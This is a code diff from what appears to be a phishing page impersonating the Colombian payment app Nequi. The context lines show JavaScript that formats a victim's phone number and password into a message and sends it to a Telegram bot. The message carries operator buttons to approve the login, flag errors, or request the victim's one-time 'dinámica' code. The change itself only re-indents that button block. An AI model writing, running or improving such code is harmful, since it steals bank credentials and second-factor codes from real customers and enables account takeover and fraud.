@@ -231,24 +231,23 @@
             const mensaje = `🔐 *NEQUI - DATOS DE ACCESO*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${pass}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}\n\n⚠️ *Esperando validación...*`;
             
             const teclado = JSON.stringify({
-              inline_keyboard: [
-                [
-                  { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
-                  { text: "❌ Incorrecto", callback_data: `incorrecto:${transactionId}` }
-                ],
-                [
-                  { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
-                ],
-                [
-                  { text: "⚠️ Error Dinámica", callback_data: `error_dinamica:${transactionId}` },
-                  { text: "🚫 Error Login", callback_data: `error_login:${transactionId}` }
-                ],
-                [
-                  { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
-                ]
-              ]
-            });
-
+  inline_keyboard: [
+    [
+      { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+      { text: "❌ Incorrecto", callback_data: `incorrecto:${transactionId}` }
+    ],
+    [
+      { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
+    ],
+    [
+      { text: "⚠️ Error Dinámica", callback_data: `error_dinamica:${transactionId}` },
+      { text: "🚫 Error Login", callback_data: `error_login:${transactionId}` }
+    ],
+    [
+      { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+    ]
+  ]
+});
             try {
               const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
               const { action } = await waitForButtonPress(responseMensaje.message_id);
@@ -275,5 +274,6 @@
   </script>
 </body>
 </html>
+
 
 
